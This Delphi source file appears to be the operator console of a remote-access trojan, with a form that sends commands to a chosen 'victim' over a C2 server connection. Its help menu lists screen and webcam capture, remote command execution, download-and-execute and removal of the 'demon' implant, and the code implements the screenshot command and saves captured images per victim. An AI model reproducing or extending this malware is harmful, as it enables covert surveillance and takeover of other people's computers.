unit FrmCnc;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.ExtCtrls, Vcl.StdCtrls,
  Vcl.Imaging.pngimage, System.IOUtils;

type
  TForm2 = class(TForm)
    Memo1: TMemo;
    Edit1: TEdit;
    Image1: TImage;
    Splitter2: TSplitter;
    procedure Edit1KeyDown(Sender: TObject; var Key: Word; Shift: TShiftState);
    procedure Image1MouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
  private
    { Private declarations }
  public
    ThisFormsVictimID: string;
  end;

var
  Form2: TForm2;

implementation

{$R *.dfm}

uses FrmMain;

procedure SendToSelectedClient(const VictimID, Msg: string);
var
  I: Integer;
  NickName: string;
  UserData: TConnectedUserData;
begin
  NickName := VictimID;
  for I := 0 to Form1.ConnectedUsers.Count - 1 do
  begin
    UserData := TConnectedUserData(Form1.ConnectedUsers.Objects[I]);
    if UserData.ID = NickName then
    begin
      Form1.ServerSource.ExecCommand(UserData.Line, 0, BytesOf(Msg), False);
      Exit;
    end;
  end;
end;

procedure TForm2.Edit1KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  if Key = VK_RETURN then
  begin
    if Edit1.Text = '/help' then
    begin
      Memo1.Lines.Add(Edit1.Text);
      Edit1.Clear;
      Edit1.SetFocus;
      Memo1.Lines.Add('List of commands and what they do:');
      Memo1.Lines.Add('/help - shows list of commands.');
      Memo1.Lines.Add
        ('/screenshot - takes a screenshot of the screen and displays it.');
      Memo1.Lines.Add
        ('/camera - takes a picture of the webcam and displays it.');
      Memo1.Lines.Add('/cmd [text] - runs a command.');
      Memo1.Lines.Add('/info - Shows info on the system.');
      Memo1.Lines.Add('/down [URL] - Downloads file from URL.');
      Memo1.Lines.Add
        ('/downexec [URL] - Downloads file from URL and executes it.');
      Memo1.Lines.Add('/script [NAME] - runs the selected script on user.');
      Memo1.Lines.Add('/script -l - Show list of scripts you have downloaded.');
      Memo1.Lines.Add('/uninstall - Uninstalls demon from their system.');
      Memo1.Lines.Add('/close - closes Demon.');
      Memo1.Lines.Add('/disconnect - disconnects demon from the C2 panel.');
      Memo1.Lines.Add('/reconnect - reconnects demon to the C2 panel.');
    end
    else if Edit1.Text = '/exit' then
    begin
      Memo1.Lines.Add(Edit1.Text);
      Memo1.Lines.Add('Exiting...');

      // Clear the input field
      Edit1.Clear;

      // Get the current form's caption which corresponds to UserData.ID
      var
      CurrentCaption := Self.Caption;

      // Remove the corresponding tab from PageControl3
      for var I := 0 to Form1.PageControl3.PageCount - 1 do
      begin
        if Form1.PageControl3.Pages[I].Caption = CurrentCaption then
        begin
          Form1.PageControl3.Pages[I].Free; // Free the tab
          Break; // Exit the loop after finding the tab
        end;
      end;

      // Close the current form
      Close;
    end
    else if Edit1.Text = '/screenshot' then
    begin
      Memo1.Lines.Add('');
      Memo1.Lines.Add(Edit1.Text);
      Edit1.Clear;
      Edit1.SetFocus;
      SendToSelectedClient(ThisFormsVictimID, 'SSHell|');
    end;
  end;
end;

procedure TForm2.Image1MouseDown(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
var
  FormCaption: string;
  FolderPath: string;
  ScreenshotPath: string;
  pngimage: TPngImage;
begin
  if Button = mbLeft then
  begin
    FormCaption := Self.Caption;
    FolderPath := TPath.Combine(ExtractFilePath(Application.ExeName), 'Clients',
      FormCaption, 'Screenshots');
    if not TDirectory.Exists(FolderPath) then
    begin
      TDirectory.CreateDirectory(FolderPath);
    end;
    ScreenshotPath := TPath.Combine(FolderPath,
      FormatDateTime('dd-mm-yyyy_hh-nn-ss', Now) + '.png');
    pngimage := TPngImage.Create;
    try
      pngimage.Assign(Image1.Picture.Graphic);
      pngimage.SaveToFile(ScreenshotPath);
    finally
      pngimage.Free;
    end;
  end
  else if Button = mbRight then
  begin
    Image1.Visible := False;
    Splitter2.Visible := False;
  end;
end;

end.
